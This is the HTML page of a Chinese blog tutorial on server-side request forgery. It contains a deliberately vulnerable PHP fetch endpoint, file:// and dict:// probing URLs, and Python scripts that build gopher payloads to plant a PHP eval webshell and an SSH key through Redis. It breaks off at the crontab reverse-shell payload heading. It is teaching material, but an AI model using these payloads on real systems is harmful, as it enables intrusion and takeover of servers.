@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>SSRF从0到0.5 | Aruk4s</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,SSRF,">
+  
+
+  <meta name="description" content="一、SSRF介绍SSRF（Server-side Request Forge, 服务端请求伪造）。 通常由攻击者在web端构造攻击链接后发送到服务端执行，从而达到外网探测信息或者作为跳板攻击内网服务。 二、SSRF产生SSRF漏洞经常出现在远程加载文件的场景中：比如某网站存在从远程加载图片到本地，一般他们的url如下： 1http://www.xxx.com/image.php?image=htt">
+<meta name="keywords" content="web,SSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF从0到0.5">
+<meta property="og:url" content="http://yoursite.com/2020/10/12/SSRF从0到1/index.html">
+<meta property="og:site_name" content="Aruk4s">
+<meta property="og:description" content="一、SSRF介绍SSRF（Server-side Request Forge, 服务端请求伪造）。 通常由攻击者在web端构造攻击链接后发送到服务端执行，从而达到外网探测信息或者作为跳板攻击内网服务。 二、SSRF产生SSRF漏洞经常出现在远程加载文件的场景中：比如某网站存在从远程加载图片到本地，一般他们的url如下： 1http://www.xxx.com/image.php?image=htt">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214184714.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214190644.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214191124.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214195654.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214195816.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214202240.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214210344.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214210442.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152516.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152725.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152656.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152836.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216153001.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201217134604.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201217134828.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228152711.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228220747.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201228153609.png">
+<meta property="og:updated_time" content="2020-12-28T14:08:13.288Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF从0到0.5">
+<meta name="twitter:description" content="一、SSRF介绍SSRF（Server-side Request Forge, 服务端请求伪造）。 通常由攻击者在web端构造攻击链接后发送到服务端执行，从而达到外网探测信息或者作为跳板攻击内网服务。 二、SSRF产生SSRF漏洞经常出现在远程加载文件的场景中：比如某网站存在从远程加载图片到本地，一般他们的url如下： 1http://www.xxx.com/image.php?image=htt">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214184714.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一、SSRF介绍"><span class="toc-text">一、SSRF介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二、SSRF产生"><span class="toc-text">二、SSRF产生</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三、SSRF后端实现以及利用"><span class="toc-text">三、SSRF后端实现以及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#File协议"><span class="toc-text">File协议:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dict协议："><span class="toc-text">Dict协议：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gopher协议："><span class="toc-text">Gopher协议：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF与Redis："><span class="toc-text">SSRF与Redis：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过gopher进行攻击"><span class="toc-text">通过gopher进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-绝对路径写shell："><span class="toc-text">1. 绝对路径写shell：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-写入ssh公钥："><span class="toc-text">2. 写入ssh公钥：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-contrab计划任务反弹shell："><span class="toc-text">3. contrab计划任务反弹shell：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF与MySQL："><span class="toc-text">SSRF与MySQL：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL连接方式："><span class="toc-text">MySQL连接方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#复现："><span class="toc-text">复现：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#主从复制："><span class="toc-text">主从复制：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理："><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#限制条件："><span class="toc-text">限制条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击流程："><span class="toc-text">攻击流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#一些自动化工具："><span class="toc-text">一些自动化工具：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#so文件的生成："><span class="toc-text">.so文件的生成：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#攻击端执行脚本："><span class="toc-text">攻击端执行脚本：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#一键GetShell："><span class="toc-text">一键GetShell：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#四、关于SSRF的绕过："><span class="toc-text">四、关于SSRF的绕过：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-text">Reference:</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-SSRF从0到1" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">SSRF从0到0.5</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2020.10.12</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>Aruk4s</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Summary/">Summary</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="一、SSRF介绍"><a href="#一、SSRF介绍" class="headerlink" title="一、SSRF介绍"></a>一、SSRF介绍</h1><p>SSRF（Server-side Request Forge, 服务端请求伪造）。</p>
+<p>通常由攻击者在web端构造攻击链接后发送到服务端执行，从而达到外网探测信息或者作为跳板攻击内网服务。</p>
+<h1 id="二、SSRF产生"><a href="#二、SSRF产生" class="headerlink" title="二、SSRF产生"></a>二、SSRF产生</h1><p>SSRF漏洞经常出现在<strong>远程加载文件</strong>的场景中：比如某网站存在从远程加载图片到本地，一般他们的url如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</span><br></pre></td></tr></table></figure>
+
+<p>其中网站的流程如下：</p>
+<blockquote>
+<p>用户先输入图片的地址-&gt;在服务端解析图片地址-&gt;服务端段获取链接地址的图片数据-&gt;把获取到的图片数据加载到前台显示</p>
+</blockquote>
+<p>当把请求发送到服务端时，系统没有校验用户的输入是不是合法的参数，所以导致了SSRF漏洞的产生。</p>
+<p>在真实的环境中，我们通常利用以下的关键字进行进行查找和判断SSRF漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">share, wap, url, link, src, source, target, u, 3g, display, sourceURl, imageURL, domain</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、SSRF后端实现以及利用"><a href="#三、SSRF后端实现以及利用" class="headerlink" title="三、SSRF后端实现以及利用"></a>三、SSRF后端实现以及利用</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单的SSRF后端 phpstudy能用 linux不能</span></span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在SSRF中我们通常使用gopher、dict、file、ftp协议，来对文件进行服务、内网的信息探测以及内网的攻击</p>
+<h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议:"></a>File协议:</h2><p>我们可以用file协议来读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="Dict协议："><a href="#Dict协议：" class="headerlink" title="Dict协议："></a>Dict协议：</h2><p>DIct协议通常用来探测端口，当端口打开时会返回端口的banner信息，当端口关闭了，页面会返回为空</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=dict://10.24.36.14:22</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214184714.png" alt><br><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214190644.png" alt></p>
+<h2 id="Gopher协议："><a href="#Gopher协议：" class="headerlink" title="Gopher协议："></a>Gopher协议：</h2><p>Gopher协议可以说是SSRF中最为关键的一环。Gopher会将后面的数据部分发送给相应的端口，这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等，同时数据部分必须要进行url编码，这样Gopher协议才能正确解析。</p>
+<p>Gopher的默认格式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:70/_ + TCP/IP数据</span><br></pre></td></tr></table></figure>
+
+<p>如果没指定端口，Gopher的默认端口为70，当访问<code>gopher：//127.0.0.1/_Aruk4s</code>时，收到的消息为：</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214191124.png" alt></p>
+<p><code>_</code>这个符号是在这里起一个连接的方式，所有的字符都可以。</p>
+<p>而实现访问内网或者直接穿刺内网的原理就是通过SSRF漏洞在服务器本地发送GET或者POST等一些请求</p>
+<h3 id="SSRF与Redis："><a href="#SSRF与Redis：" class="headerlink" title="SSRF与Redis："></a>SSRF与Redis：</h3><p>redis采用的是<code>RESP</code>协议。</p>
+<blockquote>
+<p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
+<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
+<ol>
+<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
+<li>服务器根据命令实现回复一种RESP类型。</li>
+</ol>
+<p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p>
+</blockquote>
+<p>首先模拟redis的操作</p>
+<p>先用<code>tcpdump</code>抓取一个流量包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo -l port 6379 -w redis.pcap</span><br></pre></td></tr></table></figure>
+
+<p>在redis客户端中执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set flag test</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get flag</span><br><span class="line">&quot;test&quot;</span><br></pre></td></tr></table></figure>
+
+<p>抓到的数据如下：</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214195654.png" alt></p>
+<p>转为hex转储：</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214195816.png" alt></p>
+<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>
+<p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”flag”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<h4 id="通过gopher进行攻击"><a href="#通过gopher进行攻击" class="headerlink" title="通过gopher进行攻击"></a>通过gopher进行攻击</h4><p>当攻击者能通过<strong>未授权</strong>或者<strong>弱口令访问到redis服务器</strong>的时候，可以通过gopher模拟本地服务器的操作，对redis进行一系列的攻击</p>
+<h5 id="1-绝对路径写shell："><a href="#1-绝对路径写shell：" class="headerlink" title="1. 绝对路径写shell："></a>1. 绝对路径写shell：</h5><p>先构造redis命令，通过<code>dir</code>命令redis的工作目录为web的根目录，然后设定dbfilename为shell.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>在用python脚本（网上找的）将命令转化成gopher协议的格式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"10.24.36.14"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214202240.png" alt></p>
+<p>然后尝试打一波：</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214210344.png" alt></p>
+<p>写入成功：</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201214210442.png" alt></p>
+<blockquote>
+<p>在github上面有一款叫<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a>的工具可以简化这个流程</p>
+</blockquote>
+<h5 id="2-写入ssh公钥："><a href="#2-写入ssh公钥：" class="headerlink" title="2. 写入ssh公钥："></a>2. 写入ssh公钥：</h5><p>现在本地生成一对密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152516.png" alt></p>
+<p>然后通过脚本在将密钥写入目标服务器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"10.24.36.14"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">filename=<span class="string">"authorized_keys"</span></span><br><span class="line">ssh_pub=<span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbAATnZlINjEGF3NBhMzi6sqa7G7HX8r/hcLwfaEZLq9DK0ntwalZm2PbHlo4TuMlRuwzwUzAAUTUXL40NPtNvdGsJs5Vdh1UynSqcw2apCUup+8Jrki8udIMNjcIDIIF37+PlFAChkOkQTG1XoajFLvd9yenxWa41dwkBhhZDO/bSLBOyutnQyr5amgAPHMnBlz/7hABRb7aCn5GbGIh+lnDrYFTRNkOA2Io8T4XGUDh/Tb1FpW+CU2SKNmEaEClsaR2yCfS4xojMjcyzFX8u9x7FMZmmJknjzfqoni1hLaN5KXgbIbFgl24x/mS+XFeMP4RjFDoGwUC/NB+7XTkOCloO7tFxBafKPcXdc/6B8bflCBHPimBeGMqLJNApDHcHGy4rwX1U1022VP9iz0isxa71zPVXvrW3wxKAVd/u9Kjd+wjIzd4NFu/dZcBiNYJ8fu8nz0pjOSa6a4cryk9sRsNhapTynF5fRG7ivI5XSKZDQ8GeJ+EeD943E98XcX8= root@Kali"</span></span><br><span class="line"><span class="comment">#公钥填入自己的</span></span><br><span class="line">path=<span class="string">"/root/.ssh/"</span></span><br><span class="line"><span class="comment">#shell="\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line"><span class="comment">#filename="shell1.php"</span></span><br><span class="line"><span class="comment">#path="/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(ssh_pub.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152725.png" alt></p>
+<p>在运用<code>curl</code>进行攻击</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152656.png" alt></p>
+<p>查看是否成功写入</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216152836.png" alt></p>
+<p>尝试连接</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201216153001.png" alt></p>
+<p>连接成功</p>
+<h5 id="3-contrab计划任务反弹shell："><a href="#3-contrab计划任务反弹shell：" class="headerlink" title="3. contrab计划任务反弹shell："></a>3. contrab计划任务反弹shell：</h5><p>反弹shell的要求更加严格。只能在<code>Centos</code>上使用，<code>ubuntu</code>不行。因为redis写文件后，该文件的<strong>默认权限是644</strong>。但是ubuntu执行定时任务<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，要求定时任务的权限必须是<code>-rw-------</code>，即600，所以ubuntu无法实现。而<code>Centos</code>可以执行<strong>权限为644</strong>的定时任务<code>/var/spool/cron/&lt;username&gt;</code>。</p>
+<p>同时因为redis保存RDB会出现乱码，在Ubuntu上面会发生报错，而Centos不会</p>
+<blockquote>
+<p>Ubuntu定时任务：<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos定时任务：<code>/var/spool/cron/&lt;username&gt;</code></p>
+<p>Centos和Ubuntu均存在<code>/etc/crontab</code>（该文件需要root权限，但是高版本redis默认启动是redis权限）</p>
+</blockquote>
+<p>Payload：</p>
